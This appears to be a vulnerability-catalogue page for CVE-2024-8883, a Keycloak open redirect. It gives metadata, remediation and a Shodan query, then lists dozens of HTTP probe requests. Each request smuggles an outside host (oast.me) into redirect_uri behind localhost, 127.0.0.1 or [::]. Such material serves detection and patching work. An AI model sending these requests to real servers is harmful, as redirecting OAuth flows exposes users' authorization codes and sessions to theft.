---
layout: post
cve_id: CVE-2024-8883
title: Keycloak - Open Redirect
pcap: true
pcap_path: /pcaps/2024/CVE-2024-8883.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-8883.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: medium
impact: 'Attackers can redirect users to malicious URLs and capture sensitive information
  such as authorization codes and session tokens, potentially leading to session hijacking
  and account compromise.

  '
remediation: 'Update Keycloak configuration to avoid using localhost or 127.0.0.1
  as Valid Redirect URIs, and apply security patches addressing the open redirect
  vulnerability.

  '
reference:
- https://github.com/advisories/GHSA-vvf8-2h68-9475
- https://nvd.nist.gov/vuln/detail/CVE-2024-8883
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N
  cvss-score: 6.8
  cve-id: CVE-2024-8883
  cwe-id: CWE-601
  epss-score: 0.0339
  epss-percentile: 0.87049
metadata:
  max-request: 1
  verified: true
  shodan-query: title:"keycloak"
tags:
- cve
- cve2024
- keycloak
- redirect
- vuln
- vkev
---

## üîç Vulnerability Description
A misconfiguration flaw was found in Keycloak. This issue can allow an attacker to redirect users to an arbitrary URL if a 'Valid Redirect URI' is set to http://localhost or http://127.0.0.1, enabling sensitive information such as authorization codes to be exposed to the attacker, potentially leading to session hijacking.


## üåê HTTP Request
```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=master-realm&redirect_uri=http://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=http://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=admin-cli&redirect_uri=http://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=https://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=https://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account&redirect_uri=http://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=admin-cli&redirect_uri=http://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account&redirect_uri=https://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 108) AppleWebKit/536.15 (KHTML like Gecko) Version/6.0 Safari/536.16
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=broker&redirect_uri=https://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=http://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=https://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/15.0
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=broker&redirect_uri=http://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=http://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=http://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/12.0
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=broker&redirect_uri=http://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.6.20) Gecko/ Firefox/3.6.7
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=admin-cli&redirect_uri=https://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=http://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=broker&redirect_uri=https://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=master-realm&redirect_uri=https://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=master-realm&redirect_uri=http://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account&redirect_uri=https://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.6.20) Gecko/ Firefox/3.6.2
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account&redirect_uri=http://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.10 Safari/605.1.1
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=https://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=master-realm&redirect_uri=https://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/604.1
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=admin-cli&redirect_uri=https://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=master-realm&redirect_uri=http://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=broker&redirect_uri=http://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=admin-cli&redirect_uri=http://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account&redirect_uri=http://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.8.1 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=http://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=https://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=master-realm&redirect_uri=https://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=broker&redirect_uri=https://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=admin-cli&redirect_uri=https://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.6.20) Gecko/ Firefox/3.6.1
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account&redirect_uri=https://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=https://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept-Encoding: gzip
Connection: close
```

